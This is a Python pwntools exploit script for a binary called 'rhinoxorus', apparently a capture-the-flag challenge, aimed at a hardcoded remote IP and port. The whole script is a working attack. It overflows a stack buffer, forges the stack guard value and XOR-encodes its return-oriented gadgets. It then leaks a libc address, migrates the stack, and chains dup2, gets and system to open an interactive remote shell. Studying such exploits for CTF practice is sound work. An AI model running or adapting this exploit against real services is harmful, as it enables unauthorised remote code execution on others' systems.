#!/usr/bin/python

from pwn import *
from pwnlib.log import *


# setting 
elf = ELF("rhinoxorus")
#libc = ELF("libc_local")
libc = ELF("libc.so.6")
#r = remote("localhost", 24242)
r = remote("54.152.37.20", 24242)

def pad(s, l, c = 'g'):
    while len(s) < l:
        s += c
    return s

# trigger bof
pop2 = p32(0x080578fa ^ 0x08056afa)
exp = "\xf8"*2 + "\x90"*60 + "\x6c"*38
exp += p32(0) # stack guard
exp += "a"*12
exp += pop2 # ret
exp += "aaaa" + p32(0)

# ropchain
# leak libc and stack migration
send = p32(0x0804884b ^ 0x0100)
recv = p32(elf.symbols["recv"] ^ 0x90909090)
pop3 = p32(0x080578f9)
#pop_ebp = p32(0x080578fb)
pop_ebp = p32(0x080578fb ^ 0x9090f8f8)
leave = p32(0x0804889f ^ 0x90909090) 
sock = p32(4)
sock2 = p32(4 ^ 0x90909090)
#buf = p32(0x805f500)
buf = p32(0x805f500 ^ 0x90909090)

exp += send + pop3 + sock + p32(elf.got["__libc_start_main"]) + p32(8)
exp += pop_ebp + buf + recv + leave + sock2 + buf + p32(0x100 ^ 0x90909090) + p32(0 ^ 0x90909090)
exp = pad(exp, 245, c = '\x00')
exp += '\x6c\x6c\x6c' # fuck stackguard
exp = pad(exp, 256, c = '\x00')
r.send(exp)
lsm = u32(r.recv(4))
r.recv()
libc_base = lsm - libc.symbols["__libc_start_main"]
info("libc_base: " + hex(lsm))
info("libc_base: " + hex(libc_base))
libc.address += libc_base

# system
buf2 = p32(0x805f600)
dup2 = p32(libc.symbols["dup2"])
pop2 = p32(0x080578fa)
gets = p32(libc.symbols["gets"])
system = p32(libc.symbols["system"])
exp = "aaaa" + dup2 + pop2 + sock + p32(0) + dup2 + pop2 + sock + p32(1) + gets + system + buf2 + buf2
exp = pad(exp, 0x100)
r.send(exp)


r.interactive()

